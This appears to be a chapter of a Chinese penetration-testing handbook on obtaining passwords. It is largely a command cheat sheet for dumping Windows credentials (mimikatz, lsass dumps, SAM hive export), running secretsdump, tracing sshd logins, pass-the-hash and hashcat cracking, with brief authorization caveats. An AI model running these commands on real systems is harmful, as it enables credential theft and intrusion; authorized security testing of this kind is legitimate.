# 第4章 密码获取

## Windows

- mimikatz：内存凭据、SAM/LSA、凭据管理器、3389 凭据。
- 注册表导出 SAM/SYSTEM 后离线解析。
- procdump/转储 lsass，再用 mimikatz 离线读取。
- secretsdump：远程获取哈希或明文。
- 浏览器密码：WebBrowserPassView、HackBrowserData、Sharp-HackBrowserData。
- LaZagne、SharpDecryptPwd 等工具可用于多种软件。

```cmd
mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords" exit
reg save HKLM\SYSTEM %temp%\system.hiv
reg save HKLM\SAM %temp%\sam.hiv
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

## Linux

- 检查 SSH 配置、历史命令、私钥、配置文件中的明文密码。
- 禁止在生产环境随意替换 sshd 或 PAM。
- strace 记录认证输入仅用于授权测试，注意日志文件大小。

## Web

- 修改登录页或引用的 JS 记录输入必须取得授权，并做好数据保护。
- 更推荐通过代码审计、配置文件、日志和数据库定位凭据。

## 密码碰撞

```bash
hashcat.exe -a 0 -m 111 Hash.txt dictionary.txt
hashcat.exe -a 3 -m 111 Hash.txt Admin?a?a?a?a
```

- 先确认哈希类型，再选择字典、掩码或混合模式。
- 文档密码优先使用专用工具提取/验证，避免破坏原文件。
## 命令速查

### Windows 凭据

```cmd
mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe log "privilege::debug" "vault::cred" exit
mimikatz.exe log "privilege::debug" "token::elevate" "lsadump::sam" exit
mimikatz.exe log "privilege::debug" "lsadump::lsa /patch" exit
reg save HKLM\SYSTEM C:\ProgramData\system.hiv
reg save HKLM\SAM C:\ProgramData\sam.hiv
procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp
```

### 远程/离线解析

```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
secretsdump.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

### Linux/PAM/SSH

```bash
strace -f -F -p <SSHD_PID> -t -e trace=read,write -s 4096 2>&1
# 仅授权实验环境；替换 PAM 前先备份并准备恢复
cp -p /lib64/security/pam_unix.so /lib64/security/pam_unix.so.bak
```

### hashcat

```bash
hashcat.exe -a 0 -m <TYPE> hashes.txt dictionary.txt
hashcat.exe -a 3 -m <TYPE> hashes.txt 'Admin?a?a?a?a'
hashcat.exe -a 3 -m <TYPE> --custom-charset1='?l?u?d!@#$%*.' hashes.txt '?1?1?1?1?1?1?1?1' --increment --increment-min 6
```

### 参数提示

- mimikatz `sekurlsa::pth /user:... /domain:... /ntlm:... /run:cmd.exe`
- XShell `XDecrypt.py -p <ENCRYPTED> -s <SID_OR_DICT>`
- `-m` 必须匹配实际哈希类型；先用 `hashid`/文档确认。
